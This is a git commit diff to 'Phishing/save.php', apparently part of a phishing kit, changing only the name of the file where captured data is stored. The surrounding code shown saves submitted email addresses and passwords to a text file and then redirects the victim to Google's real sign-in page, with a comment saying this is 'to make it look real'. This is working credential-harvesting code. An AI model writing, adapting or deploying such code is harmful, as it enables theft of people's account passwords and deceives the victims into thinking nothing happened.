63fea931f9c8eb83a7e246ef4579b1397f6a60a5
Abdullah-dev123 <abdullahahmed2975@gmail.com>
2025-04-09 23:21:07 +0500

    Update save.php

--- Phishing/save.php
+++ Phishing/save.php
@@ -7,7 +7,7 @@ $data = "Email: " . $email . " | Password: " . $password . "\n";
 
 // Save to a text file
 //First Create a file name data.txt or any name you want 
-file_put_contents("data.txt", $data, FILE_APPEND | LOCK_EX);
+file_put_contents("data.txt.txt", $data, FILE_APPEND | LOCK_EX);
 
 // Redirect to Google (to make it look real)
 header("Location: https://accounts.google.com/signin");
